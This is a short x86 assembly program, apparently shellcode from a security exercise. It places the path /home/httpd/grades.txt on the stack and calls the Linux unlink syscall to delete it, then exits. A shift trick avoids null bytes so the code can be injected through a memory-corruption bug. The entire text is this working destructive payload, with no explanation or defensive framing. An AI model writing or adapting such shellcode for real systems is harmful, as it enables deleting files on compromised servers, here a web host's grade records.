.globl main
main:
        # Putstring /home/httpd/grades.txt on stack
        movl $0x11117478, %ebx
        shl $0x10, %ebx
        shr $0x10, %ebx
        pushl %ebx
        pushl $0x742e7365
        pushl $0x64617267
        pushl $0x2f647074
        pushl $0x74682f65
        pushl $0x6d6f682f
        movl %esp, %ebx # Pointer to string as arg to unlink

        movb $0x9, %al
        inc %al
        int $0x80

        xorl %ebx, %ebx
        movl %ebx, %eax
        inc %eax
        int $0x80



